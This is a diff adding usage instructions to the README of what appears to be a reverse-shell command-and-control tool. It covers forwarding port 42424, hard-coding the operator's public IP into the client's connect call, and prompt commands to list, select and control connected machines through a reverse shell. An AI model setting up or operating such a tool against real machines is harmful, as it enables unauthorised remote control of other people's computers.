@@ -10,3 +10,13 @@ make sure that you have port forwading on port 42424 (you can change it if you w
 
 ## Client
 make sure that you have you public IP address there on `s.connect((%PUBLIC IP ADDRESS%, 42424))`
+
+## Using the tool
+start server.py and wait for connection.
+to see of all your connections type `snake> list` in the interacive prompt.
+to send commands to one of your connections type `select` and the ID number of the connection.
+E.X.:
+`snake> select 0`
+when you are in the reverse shell of one of your connection' you can type `getos` to see what OS is running on your connection machine.
+if you want to quit from your connection, type `quit` and then you'll be back in the interactive prompt.
+if you want to quit from the entire program type `shutdown` in the interactive prompt.
